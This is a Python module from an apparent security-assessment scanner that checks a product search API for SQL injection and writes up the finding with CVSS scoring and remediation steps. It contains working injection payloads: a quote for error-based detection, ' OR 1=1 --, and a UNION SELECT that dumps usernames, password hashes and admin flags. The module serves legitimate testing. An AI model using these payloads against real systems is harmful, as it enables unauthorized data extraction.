from typing import List
from .base import BaseModule
from ..core.vulnerability import Vulnerability

class SqlInjectionScanner(BaseModule):
    name = "SQL Injection Assessment Module"
    description = "Tests search and filter API parameters for SQL injection vulnerabilities (UNION, error-based, boolean-based)"
    category = "CWE-89 / Injection Flaws"

    def run(self) -> List[Vulnerability]:
        findings = []

        # Payload 1: Error-Based Test
        err_res, err_req_poc, err_res_poc = self.requester.request(
            method="GET",
            path="/api/v1/products/search",
            params={"q": "'"}
        )

        has_sql_error = False
        if err_res.status_code == 500:
            err_text = err_res.text.lower()
            if "sqlite" in err_text or "syntax error" in err_text or "operational error" in err_text or "sql_error" in err_text:
                has_sql_error = True

        # Payload 2: UNION-Based Data Extraction Test
        union_payload = "' UNION SELECT id, username, password_hash, role, email, is_admin FROM users --"
        union_res, union_req_poc, union_res_poc = self.requester.request(
            method="GET",
            path="/api/v1/products/search",
            params={"q": union_payload}
        )

        extracted_users = False
        if union_res.status_code == 200:
            res_str = union_res.text
            if "alice@enterprise-corp.local" in res_str or "admin@enterprise-corp.local" in res_str:
                extracted_users = True

        # Payload 3: Boolean OR 1=1 test
        bool_payload = "' OR 1=1 --"
        bool_res, bool_req_poc, bool_res_poc = self.requester.request(
            method="GET",
            path="/api/v1/products/search",
            params={"q": bool_payload}
        )

        if extracted_users or has_sql_error:
            findings.append(Vulnerability(
                vuln_id="VAPT-SQLI-001",
                title="SQL Injection in Product Search Parameter ('q')",
                severity="CRITICAL",
                cvss_score=9.8,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                owasp_category="OWASP API Top 10 - Injection Flaws",
                cwe_id="CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
                endpoint="/api/v1/products/search",
                method="GET",
                description=(
                    "The product search endpoint formats user-supplied input directly into an SQL query string "
                    "without parameterization or escaping. By injecting a UNION SELECT query, an unauthenticated "
                    "attacker extracted the complete database of users, password hashes, and administrative flags."
                ),
                business_impact=(
                    "Complete database exfiltration, unauthorized modification or deletion of data, and potential "
                    "host takeover depending on database permissions."
                ),
                remediation=(
                    "1. Use parameterized queries (prepared statements) or an Object-Relational Mapper (ORM) "
                    "for all database queries.\n"
                    "2. Avoid any dynamic string concatenation or formatting inside SQL statements.\n"
                    "3. Implement input validation and apply principle of least privilege to database connections."
                ),
                poc_request=union_req_poc if extracted_users else err_req_poc,
                poc_response=union_res_poc if extracted_users else err_res_poc,
                evidence="Successfully dumped users table via UNION SELECT payload: 'alice@enterprise-corp.local' and 'admin@enterprise-corp.local' extracted."
            ))

        return findings
